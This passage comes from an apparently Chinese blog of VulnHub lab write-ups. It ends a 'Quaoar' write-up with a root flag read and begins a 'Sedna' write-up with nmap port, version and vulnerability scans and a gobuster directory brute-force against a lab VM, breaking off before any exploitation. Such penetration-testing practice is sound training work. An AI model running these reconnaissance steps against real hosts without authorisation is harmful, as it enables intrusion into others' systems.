2012 .profile<br>406410 drwx------  2 root root 4.0K Oct 26  2016 .ssh<br> 18609 -rw-------  1 root root 4.7K Nov 30  2016 .viminfo<br>406624 drwxr-xr-x  8 root root 4.0K Jan 29  2015 vmware-tools-distrib<br>root@Quaoar:~<span class="hljs-comment"># cat flag.txt</span><br><span class="hljs-built_in">cat</span> flag.txt<br>8e3f9ec016e3598c5eec11fd3d73f6fb<br></code></pre></td></tr></table></figure><p>比想象中的简单得多</p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Sedna 靶机</title>
    <link href="/2023/09/6ad0ced59f4a.html"/>
    <url>/2023/09/6ad0ced59f4a.html</url>
    
    <content type="html"><![CDATA[<h1 id="Sedna-靶机"><a href="#Sedna-靶机" class="headerlink" title="Sedna 靶机"></a>Sedna 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Sedna]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.144                           <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-21 05:57 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.144<br>Host is up (0.00059s latency).<br>Not shown: 65523 closed tcp ports (reset)<br>PORT      STATE SERVICE<br>22/tcp    open  ssh<br>53/tcp    open  domain<br>80/tcp    open  http<br>110/tcp   open  pop3<br>111/tcp   open  rpcbind<br>139/tcp   open  netbios-ssn<br>143/tcp   open  imap<br>445/tcp   open  microsoft-ds<br>993/tcp   open  imaps<br>995/tcp   open  pop3s<br>8080/tcp  open  http-proxy<br>37302/tcp open  unknown<br>MAC Address: 08:00:27:ED:69:55 (Oracle VirtualBox virtual NIC)<br></code></pre></td></tr></table></figure><p>开放了22, 53, 80, 110, 111, 139, 143, 445, 993, 995, 8080, 37302</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Sedna]<br>└─$ sudo nmap -sT -sV -sC -O -p22,53,80,110,111,139,143,445,993,995,8080,37302 192.168.56.144<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-21 06:01 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.144<br>Host is up (0.00060s latency).<br><br>PORT      STATE SERVICE     VERSION<br>22/tcp    open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 aa:c3:9e:80:b4:81:15:<span class="hljs-built_in">dd</span>:60:d5:08:ba:3f:e0:af:08 (DSA)<br>|   2048 41:7f:c2:5d:d5:3a:68:e4:c5:d9:cc:60:06:76:93:a5 (RSA)<br>|   256 ef:2d:65:85:f8:3a:85:c2:33:0b:7d:f9:c8:92:22:03 (ECDSA)<br>|_  256 ca:36:3c:32:e6:24:f9:b7:b4:d4:1d:<span class="hljs-built_in">fc</span>:c0:da:10:96 (ED25519)<br>53/tcp    open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)<br>| dns-nsid: <br>|_  bind.version: 9.9.5-3-Ubuntu<br>80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))<br>|_http-title: Site doesn\<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="hljs-string">| http-robots.txt: 1 disallowed entry </span><br><span class="hljs-string">|_Hackers</span><br><span class="hljs-string">110/tcp   open  pop3        Dovecot pop3d</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="hljs-string">| Not valid before: 2016-10-07T19:17:14</span><br><span class="hljs-string">|_Not valid after:  2026-10-07T19:17:14</span><br><span class="hljs-string">|_pop3-capabilities: UIDL AUTH-RESP-CODE TOP STLS PIPELINING SASL CAPA RESP-CODES</span><br><span class="hljs-string">|_ssl-date: TLS randomness does not represent time</span><br><span class="hljs-string">111/tcp   open  rpcbind     2-4 (RPC #100000)</span><br><span class="hljs-string">| rpcinfo: </span><br><span class="hljs-string">|   program version    port/proto  service</span><br><span class="hljs-string">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="hljs-string">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="hljs-string">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="hljs-string">|   100000  3,4          111/udp6  rpcbind</span><br><span class="hljs-string">|   100024  1          37302/tcp   status</span><br><span class="hljs-string">|   100024  1          46167/tcp6  status</span><br><span class="hljs-string">|   100024  1          54981/udp6  status</span><br><span class="hljs-string">|_  100024  1          58453/udp   status</span><br><span class="hljs-string">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="hljs-string">143/tcp   open  imap        Dovecot imapd (Ubuntu)</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="hljs-string">| Not valid before: 2016-10-07T19:17:14</span><br><span class="hljs-string">|_Not valid after:  2026-10-07T19:17:14</span><br><span class="hljs-string">|_imap-capabilities: more capabilities STARTTLS IDLE post-login LOGINDISABLEDA0001 LOGIN-REFERRALS Pre-login IMAP4rev1 listed SASL-IR OK ID LITERAL+ ENABLE have</span><br><span class="hljs-string">|_ssl-date: TLS randomness does not represent time</span><br><span class="hljs-string">445/tcp   open            Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)</span><br><span class="hljs-string">993/tcp   open  ssl/imap    Dovecot imapd (Ubuntu)</span><br><span class="hljs-string">|_imap-capabilities: capabilities IDLE more ENABLE post-login AUTH=PLAINA0001 Pre-login IMAP4rev1 listed SASL-IR OK ID LITERAL+ LOGIN-REFERRALS have</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="hljs-string">| Not valid before: 2016-10-07T19:17:14</span><br><span class="hljs-string">|_Not valid after:  2026-10-07T19:17:14</span><br><span class="hljs-string">|_ssl-date: TLS randomness does not represent time</span><br><span class="hljs-string">995/tcp   open  ssl/pop3    Dovecot pop3d</span><br><span class="hljs-string">|_ssl-date: TLS randomness does not represent time</span><br><span class="hljs-string">|_pop3-capabilities: SASL(PLAIN) UIDL TOP AUTH-RESP-CODE PIPELINING USER CAPA RESP-CODES</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="hljs-string">| Not valid before: 2016-10-07T19:17:14</span><br><span class="hljs-string">|_Not valid after:  2026-10-07T19:17:14</span><br><span class="hljs-string">8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="hljs-string">| http-methods: </span><br><span class="hljs-string">|_  Potentially risky methods: PUT DELETE</span><br><span class="hljs-string">|_http-title: Apache Tomcat</span><br><span class="hljs-string">|_http-server-header: Apache-Coyote/1.1</span><br><span class="hljs-string">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="hljs-string">37302/tcp open  status      1 (RPC #100024)</span><br><span class="hljs-string">MAC Address: 08:00:27:ED:69:55 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 3.X|4.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="hljs-string">OS details: Linux 3.2 - 4.9</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: Host: SEDNA; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">Host script results:</span><br><span class="hljs-string">| smb-security-mode: </span><br><span class="hljs-string">|   account_used: guest</span><br><span class="hljs-string">|   authentication_level: user</span><br><span class="hljs-string">|   challenge_response: supported</span><br><span class="hljs-string">|_  message_signing: disabled (dangerous, but default)</span><br><span class="hljs-string">| smb2-security-mode: </span><br><span class="hljs-string">|   3:0:0: </span><br><span class="hljs-string">|_    Message signing enabled but not required</span><br><span class="hljs-string">|_nbstat: NetBIOS name: SEDNA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="hljs-string">|_clock-skew: mean: 9h19m57s, deviation: 2h18m34s, median: 7h59m56s</span><br><span class="hljs-string">| smb-os-discovery: </span><br><span class="hljs-string">|   OS: Unix (Samba 4.1.6-Ubuntu)</span><br><span class="hljs-string">|   NetBIOS computer name: SEDNA\x00</span><br><span class="hljs-string">|   Workgroup: WORKGROUP\x00</span><br><span class="hljs-string">|_  System time: 2023-09-21T14:01:48-04:00</span><br><span class="hljs-string">| smb2-time: </span><br><span class="hljs-string">|   date: 2023-09-21T18:01:48</span><br><span class="hljs-string">|_  start_date: N/A</span><br></code></pre></td></tr></table></figure><p>Ubuntu 操作系统, <code>/robots.txt</code>，smb, nft, 8080 Apache Tomcat&#x2F;Coyote JSP engine 1.1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Sedna]<br>└─$ sudo nmap --script=vuln -p22,53,80,110,111,139,143,445,993,995,8080,37302 192.168.56.144 <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-21 06:02 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.144<br>Host is up (0.00038s latency).<br><br>PORT      STATE SERVICE<br>22/tcp    open  ssh<br>53/tcp    open  domain<br>80/tcp    open  http<br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>| http-slowloris-check: <br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server<span class="hljs-string">&#x27;s resources causing Denial Of Service.</span><br><span class="hljs-string">|       </span><br><span class="hljs-string">|     Disclosure date: 2009-09-17</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://ha.ckers.org/slowloris/</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>| http-enum: <br>|   /robots.txt: Robots file<br>|   /files/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.7 (ubuntu)&#x27;</span><br>|   /modules/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.7 (ubuntu)&#x27;</span><br>|   /system/: Potentially interesting folder<br>|_  /themes/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.7 (ubuntu)&#x27;</span><br>110/tcp   open  pop3<br>| ssl-dh-params: <br>|   VULNERABLE:<br>|   Diffie-Hellman Key Exchange Insufficient Group Strength<br>|     State: VULNERABLE<br>|       Transport Layer Security (TLS) services that use Diffie-Hellman <span class="hljs-built_in">groups</span><br>|       of insufficient strength, especially those using one of a few commonly<br>|       shared <span class="hljs-built_in">groups</span>, may be susceptible to passive eavesdropping attacks.<br>|     Check results:<br>|       WEAK DH GROUP 1<br>|             Cipher Suite: TLS_DHE_RSA_WITH_AES_128_CBC_SHA<br>|             Modulus Type: Safe prime<br>|             Modulus Source: Unknown/Custom-generated<br>|             Modulus Length: 1024<br>|             Generator Length: 8<br>|             Public Key Length: 1024<br>|     References:<br>|_      https://weakdh.org<br>| ssl-poodle: <br>|   VULNERABLE:<br>|   SSL POODLE information leak<br>|     State: VULNERABLE<br>|     IDs:  BID:70574  CVE:CVE-2014-3566<br>|           The SSL protocol 3.0, as used <span class="hljs-keyword">in</span> OpenSSL through 1.0.1i and other<br>|           products, uses nondeterministic CBC padding, <span class="hljs-built_in">which</span> makes it easier<br>|           <span class="hljs-keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a<br>|           padding-oracle attack, aka the <span class="hljs-string">&quot;POODLE&quot;</span> issue.<br>|     Disclosure <span class="hljs-built_in">date</span>: 2014-10-14<br>|     Check results:<br>|       TLS_RSA_WITH_AES_128_CBC_SHA<br>|     References:<br>|       https://www.securityfocus.com/bid/70574<br>|       https://www.imperialviolet.org/2014/10/14/poodle.html<br>|       https://www.openssl.org/~bodo/ssl-poodle.pdf<br>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566<br>111/tcp   open  rpcbind<br>139/tcp   open  netbios-ssn<br>143/tcp   open  imap<br>| ssl-poodle: <br>|   VULNERABLE:<br>|   SSL POODLE information leak<br>|     State: VULNERABLE<br>|     IDs:  BID:70574  CVE:CVE-2014-3566<br>|           The SSL protocol 3.0, as used <span class="hljs-keyword">in</span> OpenSSL through 1.0.1i and other<br>|           products, uses nondeterministic CBC padding, <span class="hljs-built_in">which</span> makes it easier<br>|           <span class="hljs-keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a<br>|           padding-oracle attack, aka the <span class="hljs-string">&quot;POODLE&quot;</span> issue.<br>|     Disclosure <span class="hljs-built_in">date</span>: 2014-10-14<br>|     Check results:<br>|       TLS_RSA_WITH_AES_128_CBC_SHA<br>|     References:<br>|       https://www.securityfocus.com/bid/70574<br>|       https://www.imperialviolet.org/2014/10/14/poodle.html<br>|       https://www.openssl.org/~bodo/ssl-poodle.pdf<br>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566<br>| ssl-dh-params: <br>|   VULNERABLE:<br>|   Diffie-Hellman Key Exchange Insufficient Group Strength<br>|     State: VULNERABLE<br>|       Transport Layer Security (TLS) services that use Diffie-Hellman <span class="hljs-built_in">groups</span><br>|       of insufficient strength, especially those using one of a few commonly<br>|       shared <span class="hljs-built_in">groups</span>, may be susceptible to passive eavesdropping attacks.<br>|     Check results:<br>|       WEAK DH GROUP 1<br>|             Cipher Suite: TLS_DHE_RSA_WITH_AES_128_CBC_SHA<br>|             Modulus Type: Safe prime<br>|             Modulus Source: Unknown/Custom-generated<br>|             Modulus Length: 1024<br>|             Generator Length: 8<br>|             Public Key Length: 1024<br>|     References:<br>|_      https://weakdh.org<br>445/tcp   open  microsoft-ds<br>993/tcp   open  imaps<br>| ssl-dh-params: <br>|   VULNERABLE:<br>|   Diffie-Hellman Key Exchange Insufficient Group Strength<br>|     State: VULNERABLE<br>|       Transport Layer Security (TLS) services that use Diffie-Hellman <span class="hljs-built_in">groups</span><br>|       of insufficient strength, especially those using one of a few commonly<br>|       shared <span class="hljs-built_in">groups</span>, may be susceptible to passive eavesdropping attacks.<br>|     Check results:<br>|       WEAK DH GROUP 1<br>|             Cipher Suite: TLS_DHE_RSA_WITH_AES_128_CBC_SHA<br>|             Modulus Type: Safe prime<br>|             Modulus Source: Unknown/Custom-generated<br>|             Modulus Length: 1024<br>|             Generator Length: 8<br>|             Public Key Length: 1024<br>|     References:<br>|_      https://weakdh.org<br>| ssl-poodle: <br>|   VULNERABLE:<br>|   SSL POODLE information leak<br>|     State: VULNERABLE<br>|     IDs:  BID:70574  CVE:CVE-2014-3566<br>|           The SSL protocol 3.0, as used <span class="hljs-keyword">in</span> OpenSSL through 1.0.1i and other<br>|           products, uses nondeterministic CBC padding, <span class="hljs-built_in">which</span> makes it easier<br>|           <span class="hljs-keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a<br>|           padding-oracle attack, aka the <span class="hljs-string">&quot;POODLE&quot;</span> issue.<br>|     Disclosure <span class="hljs-built_in">date</span>: 2014-10-14<br>|     Check results:<br>|       TLS_RSA_WITH_AES_128_CBC_SHA<br>|     References:<br>|       https://www.securityfocus.com/bid/70574<br>|       https://www.imperialviolet.org/2014/10/14/poodle.html<br>|       https://www.openssl.org/~bodo/ssl-poodle.pdf<br>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566<br>995/tcp   open  pop3s<br>| ssl-dh-params: <br>|   VULNERABLE:<br>|   Diffie-Hellman Key Exchange Insufficient Group Strength<br>|     State: VULNERABLE<br>|       Transport Layer Security (TLS) services that use Diffie-Hellman <span class="hljs-built_in">groups</span><br>|       of insufficient strength, especially those using one of a few commonly<br>|       shared <span class="hljs-built_in">groups</span>, may be susceptible to passive eavesdropping attacks.<br>|     Check results:<br>|       WEAK DH GROUP 1<br>|             Cipher Suite: TLS_DHE_RSA_WITH_AES_128_CBC_SHA<br>|             Modulus Type: Safe prime<br>|             Modulus Source: Unknown/Custom-generated<br>|             Modulus Length: 1024<br>|             Generator Length: 8<br>|             Public Key Length: 1024<br>|     References:<br>|_      https://weakdh.org<br>| ssl-poodle: <br>|   VULNERABLE:<br>|   SSL POODLE information leak<br>|     State: VULNERABLE<br>|     IDs:  BID:70574  CVE:CVE-2014-3566<br>|           The SSL protocol 3.0, as used <span class="hljs-keyword">in</span> OpenSSL through 1.0.1i and other<br>|           products, uses nondeterministic CBC padding, <span class="hljs-built_in">which</span> makes it easier<br>|           <span class="hljs-keyword">for</span> man-in-the-middle attackers to obtain cleartext data via a<br>|           padding-oracle attack, aka the <span class="hljs-string">&quot;POODLE&quot;</span> issue.<br>|     Disclosure <span class="hljs-built_in">date</span>: 2014-10-14<br>|     Check results:<br>|       TLS_RSA_WITH_AES_128_CBC_SHA<br>|     References:<br>|       https://www.securityfocus.com/bid/70574<br>|       https://www.imperialviolet.org/2014/10/14/poodle.html<br>|       https://www.openssl.org/~bodo/ssl-poodle.pdf<br>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566<br>8080/tcp  open  http-proxy<br>| http-enum: <br>|   /examples/: Sample scripts<br>|   /manager/html/upload: Apache Tomcat (401 Unauthorized)<br>|   /manager/html: Apache Tomcat (401 Unauthorized)<br>|_  /docs/: Potentially interesting folder<br>| http-slowloris-check: <br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server\<span class="hljs-string">&#x27;s resources causing Denial Of Service.</span><br><span class="hljs-string">|       </span><br><span class="hljs-string">|     Disclosure date: 2009-09-17</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://ha.ckers.org/slowloris/</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="hljs-string">37302/tcp open  unknown</span><br><span class="hljs-string">MAC Address: 08:00:27:ED:69:55 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Host script results:</span><br><span class="hljs-string">| smb-vuln-regsvc-dos: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Service regsvc in Microsoft Windows systems vulnerable to denial of service</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference</span><br><span class="hljs-string">|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes</span><br><span class="hljs-string">|       while working on smb-enum-sessions.</span><br><span class="hljs-string">|_          </span><br><span class="hljs-string">|_smb-vuln-ms10-061: false</span><br><span class="hljs-string">|_smb-vuln-ms10-054: false</span><br></code></pre></td></tr></table></figure><p>80 端口 <code>/robots.txt</code>, <code>/files/</code>, <code>/modules/</code>, <code>/system/</code>, <code>/themes/</code></p><p>8080 端口 <code>/examples/</code>, <code>/manager/html/upload</code>, <code>/manager/html</code>, <code>/docs/</code></p><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>目录爆破一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Sedna]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.168.56.144/ -w /usr/share/seclists/Discovery/Web-Content/big.txt<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.144/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Timeout:                 10s<br>===============================================================<br>2023/09/21 07:46:42 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.htpasswd            (Status: 403) [Size: 290]<br>/.htaccess            (Status: 403) [Size: 290]<br>/blocks               (Status: 301) [Size: 316] [--&gt; http://192.168.56.144/blocks/]<br>/files                (Status: 301) [Size: 315] [--&gt; http://192.168.56.144/files/]<br>/modules              (Status: 301) [Size: 317] [--&gt; http://192.168.56.144/modules/]<br>/robots.txt           (Status: 200) [Size: 36]<br>/server-status        (Status: 403) [Size: 294]<br>/system               (Status: 301) [Size: 316] [--&gt; http://192.168.56.144/system/]<br>/themes               (Status: 301) [Size: 316] [--&gt; http://192.168.56.144/themes/]<br>Progress: 20271 / 20477 (98.99%)<br>===============================================================<br>2023/09/21 07:46:46 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p>翻找文件夹的时候，看到了这样一张图片</p><p><img 